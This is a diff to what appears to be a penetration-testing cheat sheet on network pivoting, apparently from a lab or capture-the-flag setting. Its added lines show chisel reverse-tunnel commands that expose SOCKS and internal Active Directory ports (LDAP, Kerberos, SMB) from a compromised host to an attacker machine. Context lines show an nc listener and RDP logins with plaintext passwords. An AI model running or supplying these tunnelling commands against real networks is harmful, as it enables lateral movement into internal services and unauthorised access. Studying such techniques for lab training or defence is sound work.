@@ -65,10 +65,22 @@ xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino!
 
    proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 # pivoting work
 -----------------------------------------------------------------------
-## local port forwarding for excute shell
+## local port forwarding for excute shell from <MACHINE>:3333 --> <ATTCKER-IP>:8080 
 ./chisel server --reverse -p 1234 && nc -lvnp 8080    # attacker: start chisel server and listener
 ./chisel client <ATTACKER-IP>:1234 0.0.0.0:3333:<ATTCKER-IP>:8080  # M1
 curl <M1-ip>:3333  # M2
+
+----------------------------------------------------------------------
+#  Reverse Pivoting atraffic from <ATTCKER-IP>:123 --> <MACHINE>:123
+
+#  start the server on attack host
+./chisel server -p 7777 --reverse
+# then you use
+.\chisel.exe client <Attack host ip>:7777 R:socks R:123:127.0.0.1:123/udp
+# if port 123 is not working due to perm issues on client
+
+# if the AD access only in the internal network 127.0.0.1 and we want access in from our linux attack host 
+.\chisel.exe client 10.10.14.243:7777 R:1081:socks R:389:127.0.0.1:389 R:88:127.0.0.1:88 R:636:127.0.0.1:636 R:389:127.0.0.1:389 R:445:127.0.0.1:445 
 --------------------------------------------------------------------------
 
 # 🔁 Chisel Double Pivot 
